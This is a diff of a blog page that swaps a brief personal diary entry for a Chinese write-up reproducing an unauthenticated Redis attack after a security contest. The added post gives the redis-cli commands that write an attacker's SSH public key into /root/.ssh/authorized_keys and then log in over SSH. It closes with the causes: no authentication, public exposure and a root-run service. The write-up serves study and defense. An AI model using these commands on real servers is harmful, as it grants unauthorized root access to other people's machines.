@@ -77,7 +77,7 @@
 
 
 
-  <meta name="keywords" content="碎碎念," />
+  <meta name="keywords" content="ssh,redis,未授权访问,漏洞," />
 
 
 
@@ -88,20 +88,23 @@
 
 
 
-<meta name="description" content="小记今天发生的事有点多，脑子宕机，在图书馆混迹了半天，闲来无事就摸了这个博客，曾经的WordPress太过臃肿，第一次尝试hexo，感觉还不错，就准备长期更新该博客,慢慢把文章迁移过来 （懒）（感谢给我安利这玩意的辣鸡王-天沢） 就酱 晚安">
-<meta name="keywords" content="碎碎念">
+<meta name="description" content="前言前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。">
+<meta name="keywords" content="ssh,redis,未授权访问,漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="小记">
-<meta property="og:url" content="http://melonrind.top/2017/小记/index.html">
+<meta property="og:title" content="redis未授权访问">
+<meta property="og:url" content="http://melonrind.top/2017/758b869f/index.html">
 <meta property="og:site_name" content="MelonRindCat">
-<meta property="og:description" content="小记今天发生的事有点多，脑子宕机，在图书馆混迹了半天，闲来无事就摸了这个博客，曾经的WordPress太过臃肿，第一次尝试hexo，感觉还不错，就准备长期更新该博客,慢慢把文章迁移过来 （懒）（感谢给我安利这玩意的辣鸡王-天沢） 就酱 晚安">
+<meta property="og:description" content="前言前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://melonrind.top/2017/小记/躺地小人.gif">
-<meta property="og:updated_time" content="2018-02-20T06:22:17.026Z">
+<meta property="og:image" content="http://melonrind.top/2017/758b869f/redis未授权访问-1.png">
+<meta property="og:image" content="http://melonrind.top/2017/758b869f/redis未授权访问-2.png">
+<meta property="og:image" content="http://melonrind.top/2017/758b869f/redis未授权访问-3.png">
+<meta property="og:image" content="http://melonrind.top/2017/758b869f/redis未授权访问-4.png">
+<meta property="og:updated_time" content="2018-03-16T05:14:22.278Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="小记">
-<meta name="twitter:description" content="小记今天发生的事有点多，脑子宕机，在图书馆混迹了半天，闲来无事就摸了这个博客，曾经的WordPress太过臃肿，第一次尝试hexo，感觉还不错，就准备长期更新该博客,慢慢把文章迁移过来 （懒）（感谢给我安利这玩意的辣鸡王-天沢） 就酱 晚安">
-<meta name="twitter:image" content="http://melonrind.top/2017/小记/躺地小人.gif">
+<meta name="twitter:title" content="redis未授权访问">
+<meta name="twitter:description" content="前言前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。">
+<meta name="twitter:image" content="http://melonrind.top/2017/758b869f/redis未授权访问-1.png">
 
 
 
@@ -131,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://melonrind.top/2017/小记/"/>
+  <link rel="canonical" href="http://melonrind.top/2017/758b869f/"/>
 
 
 
 
 
-  <title>小记 | MelonRindCat</title>
+  <title>redis未授权访问 | MelonRindCat</title>
   
 
 
@@ -273,7 +276,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://melonrind.top/2017/小记/">
+    <link itemprop="mainEntityOfPage" href="http://melonrind.top/2017/758b869f/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="MelonRindCat">
@@ -290,7 +293,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">小记</h1>
+          <h1 class="post-title" itemprop="name headline">redis未授权访问</h1>
         
 
         <div class="post-meta">
@@ -302,8 +305,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-23T20:43:56+08:00">
-                2017-09-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-19T20:13:31+08:00">
+                2017-11-19
               </time>
             
 
@@ -325,8 +328,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/瞎逼逼/" itemprop="url" rel="index">
-                    <span itemprop="name">瞎逼逼</span>
+                  <a href="/categories/渗透笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透笔记</span>
                   </a>
                 </span>
 
@@ -343,8 +346,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/小记/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/小记/" itemprop="commentsCount"></span>
+                <a href="/2017/758b869f/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/758b869f/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -352,7 +355,7 @@
 
           
           
-             <span id="/2017/小记/" class="leancloud_visitors" data-flag-title="小记">
+             <span id="/2017/758b869f/" class="leancloud_visitors" data-flag-title="redis未授权访问">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -383,10 +386,25 @@
       
 
       
-        <h3 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h3><p>今天发生的事有点多，脑子宕机，在图书馆混迹了半天，闲来无事就摸了这个博客，曾经的WordPress太过臃肿，第一次尝试hexo，感觉还不错，就准备长期更新该博客,慢慢把文章迁移过来 （懒）<del>（感谢给我安利这玩意的辣鸡王-天沢）</del></p>
-<p>就酱</p>
-<p>晚安</p>
-<img src="/2017/小记/躺地小人.gif" alt="躺地小人.gif" title="">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。<br><a id="more"></a></p>
+<h3 id="SSH-key-文件的准备"><a href="#SSH-key-文件的准备" class="headerlink" title="SSH key 文件的准备"></a>SSH key 文件的准备</h3><p><code>ssh-keygen -t rsa</code></p>
+<img src="/2017/758b869f/redis未授权访问-1.png" alt="redis未授权访问-1.png" title="">
+<p>在当前目录先生成.ssh的文件夹，里面有两个文件，一个私钥 id_rsa,一个公钥 id_rsa.pub。</p>
+<img src="/2017/758b869f/redis未授权访问-2.png" alt="redis未授权访问-2.png" title="">
+<h3 id="连接redis"><a href="#连接redis" class="headerlink" title="连接redis"></a>连接redis</h3><p><code>redis-cli -h 目标ip</code></p>
+<p>使用redis-cli远程管理成功连接上无认证的redis服务，由于redis拥有可以写文件的权限，所以尝试将公钥信息写入目标主机。</p>
+<p><code>config set dir /root/.ssh/</code></p>
+<p>切换当前路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config set dbfilename authorized_keys</div><div class="line">set melon &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwfw7hBoDJmxxGC2cgaXkwWzO8PouedX1mFNcH3zw2M38y1OXF59NQh9ZBsu89cj52FQHaqMToA5SEULrsnmSdBGXbyCb4MIar6WNREX/CndH7/X5FUw3rvnmSvwHgylYCrWDMWK8amU5DLTEn5YAA13voBVJyEFj1qB76MtNnQSxKlnOrWnXimWy+4dvqKXWhJ2OdB3bDhqjghZ6RyEB1oOOKh4GiMTkmTkd5YhRjFCWlroQE3hAmRHmnPSCZTcrOkQtk2/sqodSiFNQnWO+yU6pWH23EyY6SPEGU0GGfhFUi4kDdHdUwFTxxYDAffpKaMxCf0aeH+uoiINWn50q2Q== root@iZwz9a0cr2yno695xeldpyZ\n\n\n&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
+<p>将公钥信息写入authorized_keys文件，保存。</p>
+<img src="/2017/758b869f/redis未授权访问-3.png" alt="redis未授权访问-3.png" title="">
+<h3 id="ssh连接目标主机"><a href="#ssh连接目标主机" class="headerlink" title="ssh连接目标主机"></a>ssh连接目标主机</h3><p><code>ssh 目标ip</code><br><img src="/2017/758b869f/redis未授权访问-4.png" alt="redis未授权访问-4.png" title=""><br>（这里为了避免冲突，将ssh端口改为222）<br>成功连接目标主机</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>漏洞形成的原因</p>
+<ol>
+<li>redis服务无认证，且暴露在公网。</li>
+<li>redis服务使用root权限启动。</li>
+</ol>
+
       
     </div>
     
@@ -409,7 +427,13 @@
       
         <div class="post-tags">
           
-            <a href="/tags/碎碎念/" <i class="fa fa-tag"></i> 碎碎念</a>
+            <a href="/tags/ssh/" <i class="fa fa-tag"></i> ssh</a>
+          
+            <a href="/tags/redis/" <i class="fa fa-tag"></i> redis</a>
+          
+            <a href="/tags/未授权访问/" <i class="fa fa-tag"></i> 未授权访问</a>
+          
+            <a href="/tags/漏洞/" <i class="fa fa-tag"></i> 漏洞</a>
           
         </div>
       
@@ -422,14 +446,18 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2017/7c13ef06/" rel="next" title="阿里云centos 6.8 pptp搭建笔记">
+                <i class="fa fa-chevron-left"></i> 阿里云centos 6.8 pptp搭建笔记
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/第四届世安杯writeup-web/" rel="prev" title="第四届世安杯writeup-web">
-                第四届世安杯writeup-web <i class="fa fa-chevron-right"></i>
+              <a href="/2018/fda013fe/" rel="prev" title="hexo折腾笔记">
+                hexo折腾笔记 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -539,7 +567,7 @@
               
               
               <div class="site-state-item site-state-tags">
-                <a href="/tags/tags.html">
+                <a href="/tags/index.html">
                   <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
@@ -603,7 +631,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#小记"><span class="nav-number">1.</span> <span class="nav-text">小记</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH-key-文件的准备"><span class="nav-number">1.1.</span> <span class="nav-text">SSH key 文件的准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#连接redis"><span class="nav-number">1.2.</span> <span class="nav-text">连接redis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh连接目标主机"><span class="nav-number">1.3.</span> <span class="nav-text">ssh连接目标主机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a></li></ol></div>
             
 
           </div>
